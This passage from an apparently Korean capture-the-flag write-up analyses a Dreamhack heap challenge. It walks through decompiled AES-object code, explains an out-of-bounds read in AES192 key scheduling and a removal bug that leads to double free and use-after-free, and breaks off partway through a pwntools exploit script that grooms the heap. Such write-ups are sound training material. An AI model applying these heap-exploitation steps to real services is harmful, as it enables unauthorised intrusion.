</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#a6e22e">j</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">%</span> <span style="color:#ae81ff">6</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">Rot_word</span>(<span style="color:#a6e22e">a1</span>, (<span style="color:#a6e22e">unsigned</span> <span style="color:#a6e22e">__int8</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v4</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">Sub_bytes</span>(<span style="color:#a6e22e">a1</span>, (<span style="color:#a6e22e">int8_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v4</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">set_rcon</span>(<span style="color:#a6e22e">a1</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v5</span>, <span style="color:#a6e22e">j</span> <span style="color:#f92672">/</span> <span style="color:#ae81ff">24</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">add_rcon</span>(<span style="color:#a6e22e">a1</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v4</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v5</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v4</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">v4</span> <span style="color:#f92672">^</span> <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">BYTE1</span>(<span style="color:#a6e22e">v4</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">23</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">BYTE2</span>(<span style="color:#a6e22e">v4</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">22</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">HIBYTE</span>(<span style="color:#a6e22e">v4</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">a1</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">cipher_and_round_keys</span>[<span style="color:#a6e22e">j</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">21</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">v6</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>AES192의 키 스케쥴링 로직에서 OoB Read가 발생하며, secret키의 일부에 반영된다.
또한 remove 과정에 있어서 로직 버그가 발생하여 정상적이지 않은 노드가 free될 수 있었다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span>  <span style="color:#a6e22e">v9</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#e6db74">&#34;Which index do you want to delete ?&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">istream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cin</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">idx</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">idx</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v0</span> <span style="color:#f92672">&gt;=</span> <span style="color:#a6e22e">get_length</span>(<span style="color:#a6e22e">vector_AES_obj</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#e6db74">&#34;No way&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v1</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">idx_1</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">idx</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">iterator</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_vector_iterator</span>(<span style="color:#a6e22e">vector_AES_obj</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v7</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_ele_by_idx</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">iterator</span>, <span style="color:#a6e22e">idx_1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">copy_element_ptr</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">element_ptr</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">v7</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">remove_element</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">vector_AES_obj</span>, <span style="color:#a6e22e">element_ptr</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">v3</span> <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">**</span>)<span style="color:#a6e22e">get_vect_at_idx</span>(<span style="color:#a6e22e">vector_AES_obj</span>, <span style="color:#a6e22e">idx</span>);<span style="color:#75715e">// OoB delete
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">v3</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">delete</span>(<span style="color:#a6e22e">v3</span>, <span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">uLL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">v9</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">__fastcall</span> <span style="color:#a6e22e">sub_3524</span>(<span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">vecotr</span>, <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">ele_vect_ptr</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">ned</span>; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">ele_by_idx</span>; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">ele_vec</span>; <span style="color:#75715e">// [rsp+0h] [rbp-40h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">v6</span>; <span style="color:#75715e">// [rsp+8h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">next_one</span>; <span style="color:#75715e">// [rsp+18h] [rbp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">__int64</span> <span style="color:#a6e22e">end</span>[<span style="color:#ae81ff">4</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">v6</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vecotr</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">ele_vec</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ele_vect_ptr</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">end</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">end</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_end</span>(<span style="color:#a6e22e">vecotr</span>);                     <span style="color:#75715e">// vector end
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">next_one</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_ele_by_idx</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ele_vec</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">is_not_end</span>((<span style="color:#a6e22e">__int64</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">next_one</span>, (<span style="color:#a6e22e">__int64</span>)<span style="color:#a6e22e">end</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ned</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_end</span>(<span style="color:#a6e22e">v6</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ele_by_idx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_ele_by_idx</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">ele_vec</span>, <span style="color:#ae81ff">1</span><span style="color:#a6e22e">LL</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">delete_element</span>(<span style="color:#a6e22e">ele_by_idx</span>, <span style="color:#a6e22e">ned</span>, <span style="color:#a6e22e">ele_vec</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_QWORD</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">v6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">-=</span> <span style="color:#ae81ff">8</span><span style="color:#a6e22e">LL</span>;                   <span style="color:#75715e">// decrement
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">sub_3872</span>(<span style="color:#a6e22e">v6</span>, <span style="color:#f92672">*</span>(<span style="color:#a6e22e">_QWORD</span> <span style="color:#f92672">*</span>)(<span style="color:#a6e22e">v6</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>));
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ele_vec</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>마지막 노드를 삭제시 정상적으로 free가 된다.
하지만 중간 노드에 대해 삭제를 진행하면, dangling pointer가 남게 되고, double free가 발생할 수 있다.
fastbin에서 free 검증이 널널하다는 것을 생각하면, dfb도 트리거가 가능해진다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">istream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cin</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">len</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">len</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x400</span> <span style="color:#f92672">||</span> (<span style="color:#a6e22e">len</span> <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">v0</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#e6db74">&#34;Invalid {plain,cipher}text length&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">ostream</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;</span>(<span style="color:#a6e22e">v0</span>, <span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">endl</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span>,<span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">nbytes</span> <span style="color:#f92672">!=</span> <span style="color:#a6e22e">len</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">buf</span> <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">operator</span> <span style="color:#66d9ef">new</span>[](<span style="color:#a6e22e">len</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">nbytes</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">len</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">operator</span><span style="color:#f92672">&lt;&lt;&lt;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">char_traits</span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">char</span><span style="color:#f92672">&gt;&gt;</span>((<span style="color:#a6e22e">int64_t</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">std</span><span style="color:#f92672">::</span><span style="color:#a6e22e">cout</span>, (<span style="color:#a6e22e">int64_t</span>)<span style="color:#e6db74">&#34;Enter {plain,cipher}text: &#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#a6e22e">buf</span>, <span style="color:#a6e22e">nbytes</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28</span><span style="color:#a6e22e">u</span>) <span style="color:#f92672">^</span> <span style="color:#a6e22e">v3</span>;
</span></span></code></pre></div><p>여기서 freed chunk 대해서 reclaim이 가능하다.
또한 잠재적인 UAF가 발생할 수 있다.</p>
<h3 id="exploit-script-2">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script-2">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-JavaScript" data-lang="JavaScript"><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">1) AES256 Vulnerable OoB READ while initializing Key. 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">2) deleting aes object triggers UAF. 
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">3) buf reclaim leads to memleak.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">from</span> <span style="color:#a6e22e">pwn</span> <span style="color:#66d9ef">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">\#</span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>(<span style="color:#e6db74">&#39;./out.bin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">p</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">remote</span>(<span style="color:#e6db74">&#39;host3.dreamhack.games&#39;</span>, <span style="color:#ae81ff">18810</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">context</span>.<span style="color:#a6e22e">binary</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">e</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ELF</span>(<span style="color:#e6db74">&#39;./out.bin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">libc</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">ELF</span>(<span style="color:#e6db74">&#39;./bc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sla</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendlineafter</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">sa</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">sendafter</span>(<span style="color:#a6e22e">x</span>,<span style="color:#a6e22e">y</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">rvu</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lambda</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">:</span> <span style="color:#a6e22e">p</span>.<span style="color:#a6e22e">recvuntil</span>(<span style="color:#a6e22e">x</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">create_AES_object</span>(<span style="color:#a6e22e">keysz</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#ae81ff">1</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;size: &#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">keysz</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#a6e22e">idx</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#ae81ff">2</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;delete&#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">idx</span>))
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#a6e22e">sz</span>, <span style="color:#a6e22e">payload</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">assert</span> <span style="color:#a6e22e">sz</span><span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xf</span><span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#ae81ff">3</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;length:&#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">sz</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sa</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;text: &#39;</span>,<span style="color:#a6e22e">payload</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">def</span> <span style="color:#a6e22e">encrypt</span>(<span style="color:#a6e22e">idx</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#ae81ff">4</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sla</span>(<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;?&#39;</span>,<span style="color:#a6e22e">str</span>(<span style="color:#a6e22e">idx</span>))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">20</span>)<span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">11</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_AES_object</span>(<span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">19</span>,<span style="color:#ae81ff">12</span>,<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">:</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#a6e22e">i</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">6</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">free</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">vect</span>[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">vect</span>[<span style="color:#ae81ff">4</span>], <span style="color:#a6e22e">vect</span>[<span style="color:#ae81ff">5</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">vect</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">vect</span>[<span style="color:#ae81ff">2</span>], <span style="color:#a6e22e">vect</span>[<span style="color:#ae81ff">4</span>]
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">remove_AES_object</span>(<span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\xa0&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x10</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\xa0&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> <span style="color:#a6e22e">i</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">range</span>(<span style="color:#ae81ff">3</span>)<span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">create_AES_object</span>(<span style="color:#ae81ff">128</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">set_plain_cipher_txt</span>(<span style="color:#ae81ff">0x20</span>,<span style="color:#a6e22e">b</span><span style="color:#e6db74">&#39;\xa0&#39;</span>)
